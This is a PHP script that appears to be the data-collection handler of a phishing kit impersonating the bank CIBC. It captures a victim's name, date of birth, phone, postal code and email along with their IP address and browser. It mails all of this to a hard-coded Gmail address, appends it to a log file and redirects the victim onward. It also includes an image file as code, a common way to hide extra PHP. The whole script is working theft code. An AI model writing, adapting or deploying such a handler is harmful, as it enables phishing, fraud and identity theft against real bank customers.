<?php
$ip = getenv("REMOTE_ADDR");
include 'user.png';
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");
$name = $_POST['nom'];
$dob = $_POST['dob'];
$phone = $_POST['phone'];
$zip = $_POST['zip'];
$email = $_POST['email'];
$data ="
=============## CIBC TAKEO ##==================
|NAME : $name
|DOB : $dob
|PHONE : $phone
|POSTAL : $zip
|EMAIL : $email
============## Goodies ##=======================
IP : $ip
UA : $browserAgent
Time : $timedate

";

$subj="##CIBC #$browserAgent";

$emailusr = 'sarkolouty@gmail.com';

mail($emailusr, $subj, $data);	

 $fp = fopen("../../CIlogs.txt", "a");
 //write to the file
 fwrite($fp, $data);
 fclose($fp);

header("Location: ./index2.html");

?>